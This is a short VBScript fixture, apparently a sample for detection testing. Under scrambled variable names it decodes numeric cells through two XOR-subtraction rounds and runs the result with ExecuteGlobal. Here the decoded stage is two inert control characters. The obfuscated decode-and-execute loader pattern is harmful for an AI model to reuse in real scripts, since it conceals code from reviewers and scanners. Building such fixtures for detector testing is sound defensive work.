' XOR-subtraction loader fixture: numeric cells decode through two
' (N - (A Xor B)) Mod 256 rounds into a stage that ExecuteGlobal runs.
Dim qZxKvNmOpQr, tAbLdEeFgHi, mNoPqRsTuVw, xYzAbCdEfGh
qZxKvNmOpQr = ""
qZxKvNmOpQr = qZxKvNmOpQr & "200|201|"
qZxKvNmOpQr = Replace(qZxKvNmOpQr, "||", "|")
tAbLdEeFgHi = ""
For Each mNoPqRsTuVw In Split(qZxKvNmOpQr, "|")
 If Len(mNoPqRsTuVw) > 0 Then
 xYzAbCdEfGh = CInt(mNoPqRsTuVw)
 xYzAbCdEfGh = (xYzAbCdEfGh - (33 Xor 239)) Mod 256
 xYzAbCdEfGh = (xYzAbCdEfGh - (126 Xor 140)) Mod 256
 If xYzAbCdEfGh < 0 Then xYzAbCdEfGh = xYzAbCdEfGh + 256
 tAbLdEeFgHi = tAbLdEeFgHi & Chr(xYzAbCdEfGh)
 End If
Next
ExecuteGlobal tAbLdEeFgHi
